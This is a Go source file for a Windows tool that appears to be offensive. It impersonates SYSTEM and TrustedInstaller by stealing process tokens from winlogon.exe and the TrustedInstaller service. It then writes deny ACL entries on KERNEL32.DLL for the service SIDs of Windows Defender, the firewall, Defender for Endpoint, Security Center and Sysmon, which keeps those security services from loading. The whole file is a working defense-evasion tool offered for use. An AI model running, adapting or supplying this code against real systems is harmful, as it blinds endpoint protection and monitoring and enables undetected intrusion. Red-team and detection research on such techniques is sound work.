package main

import (
	"crypto/sha1"
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"

	winio "github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

type tokenstealer struct {
	servicename string
	executable  string
}

const (
	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_QUERY             = 0x0008
	TOKEN_QUERY_SOURCE      = 0x0010
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_ADJUST_GROUPS     = 0x0040
	TOKEN_ADJUST_DEFAULT    = 0x0080
	TOKEN_ADJUST_SESSIONID  = 0x0100
	TOKEN_ALL_ACCESS        = 0xF01FF
)

var (
	SYSTEM = tokenstealer{
		executable: "winlogon.exe",
	}
	TRUSTEDINSTALLER = tokenstealer{
		servicename: "TrustedInstaller",
		executable:  "trustedinstaller.exe",
	}
	modadvapi32             = syscall.NewLazyDLL("advapi32.dll")
	impersonateLoggedOnUser = modadvapi32.NewProc("ImpersonateLoggedOnUser")
	openProcessToken        = modadvapi32.NewProc("OpenProcessToken")
	duplicateTokenEx        = modadvapi32.NewProc("DuplicateTokenEx")
	procDeleteAce           = modadvapi32.NewProc("DeleteAce")
	procInitializeAcl       = modadvapi32.NewProc("InitializeAcl")
)

func enableSeDebugPrivilege() error {
	return winio.EnableProcessPrivileges([]string{"SeDebugPrivilege"})
}

func deleteAce(acl *windows.ACL, aceIndex uint32) (*windows.ACL, error) {
	res, _, err := procDeleteAce.Call(uintptr(unsafe.Pointer(acl)), uintptr(aceIndex))
	if res == 0 {
		return nil, err
	}
	return acl, nil
}

func parseProcessName(exeFile [windows.MAX_PATH]uint16) string {
	for i, v := range exeFile {
		if v <= 0 {
			return string(utf16.Decode(exeFile[:i]))
		}
	}
	return ""
}

func getProcessPid(executable string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	if err := windows.Process32First(snapshot, &procEntry); err != nil {
		return 0, err
	}

	for {
		if strings.EqualFold(parseProcessName(procEntry.ExeFile), executable) {
			return procEntry.ProcessID, nil
		} else {
			if err = windows.Process32Next(snapshot, &procEntry); err != nil {
				if err == windows.ERROR_NO_MORE_FILES {
					break
				}
				return 0, err
			}
		}
	}
	return 0, fmt.Errorf("cannot find %v in running process list", executable)
}

func getpid(ts tokenstealer) (uint32, error) {
	if ts.servicename != "" {
		svcMgr, err := mgr.Connect()
		if err != nil {
			return 0, fmt.Errorf("cannot connect to svc manager: %v", err)
		}
		defer svcMgr.Disconnect()

		n, err := windows.UTF16PtrFromString(ts.servicename)
		if err != nil {
			return 0, err
		}
		h, err := windows.OpenService(svcMgr.Handle, n, windows.SERVICE_QUERY_STATUS|windows.SERVICE_START|windows.SERVICE_STOP|windows.SERVICE_USER_DEFINED_CONTROL)
		if err != nil {
			return 0, err
		}
		s := &mgr.Service{Name: ts.servicename, Handle: h}
		defer s.Close()

		status, err := s.Query()
		if err != nil {
			return 0, fmt.Errorf("cannot query service: %v", err)
		}

		if status.State != svc.Running {
			if err := s.Start(); err != nil {
				return 0, fmt.Errorf("cannot start service: %v", err)
			}
		}
	}

	pid, err := getProcessPid(ts.executable)
	if err != nil {
		return 0, fmt.Errorf("cannot get process pid: %v", err)
	}
	return pid, nil
}

func impersonate(ts tokenstealer) error {
	pid, err := getpid(ts)
	if err != nil {
		return fmt.Errorf("cannot get pid: %v", err)
	}

	hand, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hand)

	var hToken syscall.Handle
	res, _, err := openProcessToken.Call(uintptr(hand), TOKEN_DUPLICATE|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if res == 0 {
		return fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hToken))

	var hDup syscall.Handle
	res, _, err = duplicateTokenEx.Call(uintptr(hToken), TOKEN_ALL_ACCESS, 0, 2, 1, uintptr(unsafe.Pointer(&hDup)))
	if res == 0 {
		return fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hDup))

	res, _, err = impersonateLoggedOnUser.Call(uintptr(hDup))
	if res == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
	}
	return nil
}

func serviceSid(shortname string) string {
	s := sha1.New()
	bytes := make([]byte, len(shortname)*2)
	for i, pair := range utf16.Encode([]rune(strings.ToUpper(shortname))) {
		bytes[i*2] = byte(pair)
		bytes[i*2+1] = byte(pair << 8)
	}
	s.Write(bytes)
	hash := s.Sum(nil)
	sid := "S-1-5-80"
	for i := 0; i <= 16; i += 4 {
		val := binary.LittleEndian.Uint32(hash[i:])
		sid += fmt.Sprintf("-%v", val)
	}
	return sid
}

type stringSlice []string

func (s *stringSlice) String() string {
	return strings.Join(*s, ",")
}

func (s *stringSlice) Set(value string) error {
	*s = append(*s, strings.Split(value, ",")...)
	return nil
}

func main() {
	var services stringSlice
	flag.Var(&services, "services", "List of services to disable (comma separated)")
	targetdll := flag.String("target", "C:\\WINDOWS\\SYSTEM32\\KERNEL32.DLL", "Target to prohibit loading")
	remove := flag.Bool("remove", false, "Remove all DENY ACLs from specified target rather than adding them")

	flag.Parse()

	if len(services) == 0 {
		services = []string{"WinDefend", "mpssvc", "Sense", "MDCoreSvc", "wscsvc", "WdNisSvc", "sysmon", "sysmon64"}
	}

	if err := enableSeDebugPrivilege(); err != nil {
		fmt.Printf("can not enable debug privs: %v\n", err)
		os.Exit(1)
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := impersonate(SYSTEM)
	if err != nil {
		fmt.Printf("Cannot impersonate SYSTEM: %v\n", err)
		os.Exit(1)
	}

	err = impersonate(TRUSTEDINSTALLER)
	if err != nil {
		fmt.Printf("Cannot impersonate TRUSTEDINSTALLER: %v\n", err)
		os.Exit(1)
	}

	sd, err := windows.GetNamedSecurityInfo(*targetdll, windows.SE_FILE_OBJECT, windows.DACL_SECURITY_INFORMATION)
	if err != nil {
		fmt.Printf("Cannot get DACL from %v: %v\n", *targetdll, err)
		os.Exit(1)
	}

	acl, _, err := sd.DACL()
	if err != nil {
		fmt.Printf("Error extracting DACL: %v\n", err)
		os.Exit(1)
	}

	var sids []*windows.SID
	for _, service := range services {
		sid, err := windows.StringToSid(serviceSid(service))
		if err != nil {
			fmt.Printf("cannot convert SID to string: %v\n", err)
			os.Exit(1)
		}
		sids = append(sids, sid)
	}

	var newacl *windows.ACL
	if *remove {
		newacl = acl
		var ace *windows.ACCESS_ALLOWED_ACE
		i := 0
		for {
			err = windows.GetAce(newacl, uint32(i), &ace)
			if err != nil {
				fmt.Printf("Error getting ACE %v: %v\n", i, err)
				os.Exit(1)
			}
			if ace.Header.AceType == windows.ACCESS_DENIED_ACE_TYPE {
				newacl, err = deleteAce(newacl, uint32(i))
				if err != nil {
					fmt.Printf("Error deleting ACE %v: %v\n", i, err)
					os.Exit(1)
				}
				continue
			}
			i++
			if i >= int(acl.AceCount) {
				break
			}
		}
	} else {
		var trusteelist []windows.EXPLICIT_ACCESS
		for _, sid := range sids {
			trusteelist = append(trusteelist, windows.EXPLICIT_ACCESS{
				AccessPermissions: windows.GENERIC_ALL,
				AccessMode:        windows.DENY_ACCESS,
				Inheritance:       windows.NO_INHERITANCE,
				Trustee: windows.TRUSTEE{
					TrusteeForm:  windows.TRUSTEE_IS_SID,
					TrusteeType:  windows.TRUSTEE_IS_UNKNOWN,
					TrusteeValue: windows.TrusteeValueFromSID(sid),
				},
			})
		}
		newacl, err = windows.ACLFromEntries(trusteelist, acl)
		if err != nil {
			fmt.Printf("cannot create new ACL: %v\n", err)
			os.Exit(1)
		}
	}

	if err := windows.SetNamedSecurityInfo(
		*targetdll, windows.SE_FILE_OBJECT,
		windows.DACL_SECURITY_INFORMATION,
		nil, nil, newacl, nil); err != nil {
		fmt.Printf("cannot set security info on %s: %v\n", *targetdll, err)
		os.Exit(1)
	}

	fmt.Println("Operation completed successfully.")
	os.Exit(0)
}
